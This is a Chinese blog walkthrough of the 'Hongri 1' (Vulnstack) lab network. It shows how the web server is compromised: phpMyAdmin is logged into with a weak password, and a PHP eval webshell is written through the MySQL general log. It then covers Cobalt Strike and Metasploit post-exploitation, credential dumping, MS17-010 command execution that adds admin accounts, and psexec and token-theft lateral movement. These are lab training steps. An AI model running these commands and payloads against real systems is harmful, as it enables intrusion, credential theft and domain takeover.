

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" href="/img/logo.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="永安寺">
  <meta name="keywords" content="">
  
  <title>红日1 - Victory</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.6.0/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  



<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"txluck.github.io","root":"/","version":"1.8.10","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"NnQfFjLx8ctoF1RbDVgWqADt-gzGzoHsz","app_key":"0Lsfi2upctErQTQC8xHAMnIs","server_url":"https://nnqffjlx.lc-cn-n1-shared.com"}}};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Victory's Note</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友链
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="红日1">
              
            </span>

            
              <div class="mt-3">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-author" aria-hidden="true"></i>
      永安寺
    </span>
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-10-30 13:47" pubdate>
        2021年10月30日 下午
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      2k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      22
       分钟
    </span>
  

  
  
    
      <!-- LeanCloud 统计文章PV -->
      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
        <i class="iconfont icon-eye" aria-hidden="true"></i>
        <span id="leancloud-page-views"></span> 次
      </span>
    
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">红日1</h1>
            
            <div class="markdown-body">
              <ul>
<li><h3 id="概念图"><a href="#概念图" class="headerlink" title="概念图"></a>概念图</h3></li>
<li><p><img src="https://api2.mubu.com/v3/document_image/ce7ddd3f-7c6b-4763-81dc-928d373c4210-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>靶场环境  win7 是web服务器  2003 是域成员   2008是域控</p>
</li>
<li><p>添加一个网卡<img src="https://api2.mubu.com/v3/document_image/1110999a-0830-44ce-9843-fed59fcd7e34-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>win7是双网卡 一个桥接  一个52网段的网卡 另外两个都是52网段的网卡</p>
</li>
<li><h3 id="实验开始"><a href="#实验开始" class="headerlink" title="实验开始"></a>实验开始</h3><ul>
<li><p>输入web服务器ip  打开是一个php探针页面</p>
<ul>
<li><p>通过这个页面可以 看到绝对路径 服务器信息  搭建的phpstydy版本  以及可以在最下面进行mysql数据库的连接测试<img src="https://api2.mubu.com/v3/document_image/e08519a6-4bc3-494a-96d6-7c111e5329af-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>发现是php探针  就会联想到 phpmyadmin  一般这种是联合搭配的  直接在页面输入phpmyadmin进行测试<img src="https://api2.mubu.com/v3/document_image/b3f4e125-46b9-449a-8be5-9522e80f0b76-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>直接进到phpmyadmin界面  然后就可以用 弱口令进行测试 root  root<img src="https://api2.mubu.com/v3/document_image/10d6950b-de02-403a-89f3-8fde81b901f7-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>进到phpmyadmin里面 我们就可以通过phpmyadmin拿webshell了</p>
</li>
<li><p>先直接通过mysql 试试导入一句话</p>
</li>
<li><p>执行之后发现报错<img src="https://api2.mubu.com/v3/document_image/52a584a1-0f7b-4148-8f88-3eab30103256-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后翻译一下报错信息<img src="https://api2.mubu.com/v3/document_image/bac7ea1e-9123-4f3d-86a9-1d25df775ccf-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>发现是secure file priv  然后使用命令查看一下secure的设置<img src="https://api2.mubu.com/v3/document_image/2c9eaf0e-f235-44b8-9b5a-ce9e3230bfd4-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>发现secure file priv   是null  上面是off   这样设置是不允许导入文件的 只能读  所以我们可以尝试写全局日志的方式进行getshell</p>
</li>
<li><p>先用命令查看日志的配置 show global variables like ‘%general_%’<img src="https://api2.mubu.com/v3/document_image/297a0451-f640-4b43-b322-2783ea9101e4-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>可以看到 全局日志是关闭的  和全局日志的记录位置   所以接下来就需要将全局日志打开  然后将路径也改了</p>
</li>
<li><p>打开日志 命令：set global general_log = on<img src="https://api2.mubu.com/v3/document_image/b28974fa-554e-44a2-ad8f-19ac1cd77f16-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>修改路径 命令 set global general_log_file = ‘C:/phpStudy/WWW/hack.php’<img src="https://api2.mubu.com/v3/document_image/6c5b95c7-2aba-4afe-b47f-62b3044d0c65-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后进行一句话写入 命令 ： select “<?php eval($_POST['cmd']);?>“<img src="https://api2.mubu.com/v3/document_image/6d8dac8b-e137-417b-b077-3a05ba03afcb-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后打开靶机看一看 效果<img src="https://api2.mubu.com/v3/document_image/97e6c4fb-bba0-48d0-b0dc-7a44a13c760a-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"><img src="https://api2.mubu.com/v3/document_image/f9159448-e645-4ace-b245-b54d51bb0cc4-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>一句话成功写入  打开蚁剑 进行连接<img src="https://api2.mubu.com/v3/document_image/8420c81d-6725-4fc4-b4c5-b193ba3b7058-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>成功连接   webshell 拿下</p>
</li>
<li><p>发现还有一个yxcms的 应该是有一个页面的  用浏览器打开<img src="https://api2.mubu.com/v3/document_image/55db3e09-09e5-4d80-9a0f-9b5c41f38d31-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>因为是靶场的缘故 直接告诉了后台地址和用户账号密码  正常情况下 是没有这些的 需要通过常规的渗透手段 进行获取  因为有了地址和密码 就直接登录后台<img src="https://api2.mubu.com/v3/document_image/b0f83ce1-4942-4b04-8560-ab0c84f9d0c1-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后首先就是看看有什么地方可以getshell</p>
</li>
<li><p>发现sql执行   root权限  就可以和上面一样  试试直接写入一句话  或者 用全日志写入一句话<img src="https://api2.mubu.com/v3/document_image/64bf056a-e3c2-4f21-9904-6dcfc5c71b73-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>在看看其他地方  发现模板<img src="https://api2.mubu.com/v3/document_image/fcea861a-e446-40d9-b2a8-0e1b97627f01-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>这里我们可以修改一个模板 插入一句话  或者新建一个  插入大马 或小马行</p>
</li>
<li><p>新建一个小马<img src="https://api2.mubu.com/v3/document_image/948c4052-a354-4339-861c-dfde7471bcd3-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"><img src="https://api2.mubu.com/v3/document_image/473ea7ad-e557-4a19-835c-806d71e0ce1f-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>模板创建好后  接下来的问题就是 找到路径</p>
</li>
<li><p>在后台 发现无法找到路径   换个思路 通过御剑扫描目录 看看有木有新发现<img src="https://api2.mubu.com/v3/document_image/ac872fa7-ac81-4a78-a3b4-ee8b86216b9f-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>发现一个目录遍历  然后可以查看目录 找到 创建的模板路径<img src="https://api2.mubu.com/v3/document_image/284c8ff1-65c2-4f0d-adab-2c8d54cd6463-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>直接扫描域名   发现有备份文件  也可以直接下载备份文件 查找路径<img src="https://api2.mubu.com/v3/document_image/1e56a8fe-1211-4420-88e9-0a49c21cda31-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>找到路径之后 直接用蚁剑进行连接<img src="https://api2.mubu.com/v3/document_image/8d56995b-2491-4075-83fa-394a97663b95-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"><img src="https://api2.mubu.com/v3/document_image/d250eb4a-cf09-4c4f-ae20-e74e11b3ef4e-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"><img src="https://api2.mubu.com/v3/document_image/a2b2522a-b0de-4690-bcb2-11e845dd6fa8-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>这样 也可以getshell</p>
</li>
<li><p>拿下webshell执行 就该进行内网渗透</p>
</li>
</ul>
</li>
<li><h3 id="内网实现"><a href="#内网实现" class="headerlink" title="内网实现"></a>内网实现</h3><ul>
<li><p>发现权限是administrator 权限挺高 就不需要提权了  然后是Windows系统  可以结合cs 上线操作<img src="https://api2.mubu.com/v3/document_image/59de277b-f641-4f8e-847d-69f903b282ab-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>打开cs  生成一个后门<img src="https://api2.mubu.com/v3/document_image/7a6004da-af1d-4acf-aabc-024e545c7f66-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后将它传上去   <img src="https://api2.mubu.com/v3/document_image/ed745ad7-ee29-42ab-a275-90240a5bfa97-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后执行上线<img src="https://api2.mubu.com/v3/document_image/f3ebeb09-d149-4a1c-9195-95a68598723d-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>上线之后 第一步 还是先把延时设置为0<img src="https://api2.mubu.com/v3/document_image/44e63cae-0534-4579-bf32-a9c0a07ffd0e-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后就可以直接用cs 进行目标的信息收集  例如收集目标打的补丁<img src="https://api2.mubu.com/v3/document_image/b921bdd5-72b1-4c00-ab9c-fb28c621b123-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>打了4个补丁  然后就可以随便上exp打 就行了</p>
</li>
<li><p>抓取密码   直接发现是明文密码<img src="https://api2.mubu.com/v3/document_image/b34f3131-1c07-4802-a2c4-d64322398d9f-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>logonpasswords #拖取明文密码与NMTL票据              </p>
</li>
<li><p>NTLM  也可以直接去md5解密<img src="https://api2.mubu.com/v3/document_image/2883c5f0-1d89-4df7-94e9-ce41ee9f279c-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>又因为是administrator权限 可以直接创建用户 然后直接用cs 开启3389  <img src="https://api2.mubu.com/v3/document_image/1083ea47-fc3d-4489-a0d5-0ba4f1a1942e-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后进行连接  可以直接连接<img src="https://api2.mubu.com/v3/document_image/50e6285d-23e8-4eeb-9ac7-b7b23ba02c33-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>另外 也可以通过msf 联动配合   cs和msf联动的时候  cs需要新建一个监听器<img src="https://api2.mubu.com/v3/document_image/2d4dea48-eeba-445e-b62b-2fcad49b9d80-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后设置msf<img src="https://api2.mubu.com/v3/document_image/dc82f881-261f-4e87-b6f9-d23eb61ce0bf-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>这里是重点 需要用http才行</p>
</li>
<li><p>然后用cs新建会话  选择设置的MSF监听器<img src="https://api2.mubu.com/v3/document_image/aadd83b3-fa03-4405-9437-637a7b599add-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后msf这边会话就弹回来了<img src="https://api2.mubu.com/v3/document_image/bb11c633-d62a-43d6-8b06-1e9f28e7f689-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后用msf自带的模块 直接提升为system权限  命令  getsystem<img src="https://api2.mubu.com/v3/document_image/2bcc9ed2-f30b-4f97-81e3-b659bf0926f5-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>还是先通过arp -a  查看一下网段情况  发现还有 两台机器<img src="https://api2.mubu.com/v3/document_image/339024c8-c94c-4c52-8f4f-7769eba83f75-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>因为那两台是存在内网的  所以之后的操作 就需要先设置路由来操作</p>
</li>
<li><p>设置路由 命令 run autoroute -s 192.168.52.0/24<img src="https://api2.mubu.com/v3/document_image/458853d2-d404-4686-9ed3-16465f20167a-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后查看路由添加情况 命令 run autoroute -p<img src="https://api2.mubu.com/v3/document_image/b058d8ac-6c2f-4f6c-a6b2-038433658370-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>用模块扫描一下存活的主机 命令 run post/windows/gather/arp_scanner rhosts=192.168.52.0/24</p>
<ul>
<li>143 是web服务器的  已经被拿下</li>
</ul>
</li>
<li><p>接下来就是拿下另外两台  先将会话挂起 然后就需要进行socks代理 拿下另外两台</p>
</li>
<li><p>命令 use auxiliary/server/socks_proxy <img src="https://api2.mubu.com/v3/document_image/9648065f-048b-4b67-a85d-60557e35906b-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>配置相关设置<img src="https://api2.mubu.com/v3/document_image/246c6cb4-c913-4bb8-9f94-948f73259d63-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后查看配置文件是否一致 命令 vim /etc/proxychains4.conf <img src="https://api2.mubu.com/v3/document_image/509197c8-7ffe-4d57-8e1f-cdff5897190d-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后 扫描端口 proxychains nmap -sT -Pn -T4 192.168.52.141</p>
</li>
<li><p>这里也可以通过cs自带的portscan模块  端口扫描 进行端口探测<img src="https://api2.mubu.com/v3/document_image/500814ec-c5fd-471c-9246-0ce1150e533d-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后发现都打开了445端口  这里就推测有有m17010  但是发现利用失败  换一种m17010的使用方法  添加账户的方法</p>
</li>
<li><p>命令 use auxiliary/admin/smb/ms17_010_command <img src="https://api2.mubu.com/v3/document_image/208162fb-baad-4a87-ad3b-ec2ba13d5d0c-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p><img src="https://api2.mubu.com/v3/document_image/f9d56611-aa1c-4599-acd6-6a71ec80bcdf-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后设置相关配置  设置添加的账户和密码  密码需要复杂点 不然 过不了规则<img src="https://api2.mubu.com/v3/document_image/f91a5942-ceb1-42a9-b6f3-940c9b6a99f1-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后将创建的用户 添加到管理组 命令  set COMMAND net localgroup administrators hack /add<img src="https://api2.mubu.com/v3/document_image/fa1d9156-5df2-475a-bc64-8c1f365d81aa-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p><img src="https://api2.mubu.com/v3/document_image/37b6b0de-43ed-4980-896a-d0ef52633712-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>域成员拿下</p>
</li>
<li><p>域控</p>
</li>
<li><p>开始进行对域控的渗透  上面利用cs对端口进行了扫描  打开了445 端口 直接用msf的模块测试</p>
</li>
<li><p>命令：use auxiliary/scanner/smb/smb_ms17_010</p>
</li>
<li><p> msf6 auxiliary(scanner/smb/smb_ms17_010) &gt;  set rhost 192.168.52.138<img src="https://api2.mubu.com/v3/document_image/2e20d943-81da-41f8-901b-bed142768443-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>直接开打</p>
</li>
<li><p>利用搜索模块 命令 search ms17_010<img src="https://api2.mubu.com/v3/document_image/1a3079bc-f715-445d-b399-fa3a4ce2f35a-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>我们用第一个</p>
</li>
<li><p>命令：use auxiliary/admin/smb/ms17_010_command </p>
</li>
<li><p>然后将创建的用户 添加到管理组 命令  set COMMAND net user hack1 bhanquan@2021 /add</p>
</li>
<li><p>然后exploit开打<img src="https://api2.mubu.com/v3/document_image/c75a4383-1e3a-46a3-a7c4-b218b6b31c7d-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后将 用户添加到管理组 命令 ：set COMMAND net localgroup administrators hack /add</p>
</li>
<li><p>然后exploit</p>
</li>
<li><p>然后查看添加是否成功 命令set COMMAND net localgroup administrators<img src="https://api2.mubu.com/v3/document_image/f8044348-e749-442e-97a4-ee145d3ca4d2-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>添加成功</p>
</li>
</ul>
</li>
<li><p>另外操作(不太熟练 有点懵)</p>
<ul>
<li><p>在上面已经通过cs抓到了 域管的密码   和通过msf 用ms17 010 创建了账户</p>
</li>
<li><p>然后用cs  的  SMB Beacon操作</p>
<ul>
<li>SMB Beacon 使用命名管道通过父级 Beacon 进行通讯，当两个 Beacons 链接后，子 Beacon 从父 Beacon 获取到任务并发送。因为链接的 Beacons 使用 Windows 命名管道进行通信，此流量封装在 SMB 协议中，所以 SMB Beacon 相对隐蔽，绕防火墙时可能发挥奇效</li>
</ul>
</li>
<li><p>在已有的 beacon 上创建监听，用来作为跳板进行内网穿透</p>
</li>
<li><p>前提是能够通过 shell 之类访问到内网其他主机</p>
</li>
<li><p>psexec 使用凭证登录其他主机</p>
</li>
<li><p>前面横向探测已经获取到内网内的其他 Targets 以及读取到的凭证信息</p>
</li>
<li><p>于是可以尝试使用 psexec 模块登录其他主机</p>
</li>
<li><p>右键选择一台非域控主机 ROOT-TVI862UBEH 的 psexec 模块：<img src="https://api2.mubu.com/v3/document_image/d0d29ddd-99e7-4e74-b517-d20c989b4a76-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>在弹出的窗口中选择使用 god.org 的 Administrator 的凭证信息</p>
</li>
<li><p>监听器选择刚才创建的 smb beacon，会话也选择对应的 smb beacon 的会话：<img src="https://api2.mubu.com/v3/document_image/50f3ab12-a09b-4c06-a877-8f24c827ec3d-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"><img src="https://api2.mubu.com/v3/document_image/4e576afb-7928-46ff-926c-e9bd456cb772-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>执行后效果如下：<img src="https://api2.mubu.com/v3/document_image/175adf88-e1fb-4e9e-960e-a4d251a441eb-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>之后的OWA 也是相同的办法</p>
</li>
<li><p>最终的图示图<img src="https://api2.mubu.com/v3/document_image/ecadb6f6-6a53-4fc7-a45e-251c8c041646-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>toke窃取</p>
<ul>
<li><p>除了直接使用获取到的 hash 值，也可以直接窃取 GOD\Administrator 的 token 来登录其他主机</p>
</li>
<li><p>选择 beacon 右键 -&gt; 目标 -&gt; 进程列表</p>
</li>
<li><p>选择 GOD\Administrator 的 token 盗取：<img src="https://api2.mubu.com/v3/document_image/25f073c7-3474-4b81-ae0a-14ea3f181a69-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>然后在选择令牌处勾选使用当前 token 即可：<img src="https://api2.mubu.com/v3/document_image/5f59abac-ac17-421a-95eb-cacebdf49cf7-11763069.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
</li>
<li><p>效果和前面是一样的</p>
</li>
<li><p>之后就可以开3389 什么的 进行远程连接</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>参考：<a target="_blank" rel="noopener" href="https://soapffz.com/sec/558.html#menu_index_15">https://soapffz.com/sec/558.html#menu_index_15</a></p>
</li>
<li><p>参考：<a target="_blank" rel="noopener" href="https://www.cooyf.com/bj/vulnstack1.html#toc_8">https://www.cooyf.com/bj/vulnstack1.html#toc_8</a></p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/231111.html">https://www.freebuf.com/column/231111.html</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.hacksafe.net/articles/web/4463.html">https://www.hacksafe.net/articles/web/4463.html</a></p>
</li>
</ul>
</li>
</ul>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/">红日靶场</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/%E9%9D%B6%E5%9C%BA/">靶场</a>
                    
                      <a class="hover-with-bg" href="/tags/%E5%86%85%E7%BD%91/">内网</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/10/30/%E7%BA%A2%E6%97%A52/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">红日2</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/">
                        <span class="hidden-mobile">简单逆向分析1</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- LeanCloud 统计PV -->
        <span id="leancloud-site-pv-container" style="display: none">
            总访问量 
            <span id="leancloud-site-pv"></span>
             次
          </span>
      
      
        <!-- LeanCloud 统计UV -->
        <span id="leancloud-site-uv-container" style="display: none">
            总访客数 
            <span id="leancloud-site-uv"></span>
             人
          </span>
      

    
  </div>


  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.2/dist/tocbot.min.js" ></script>



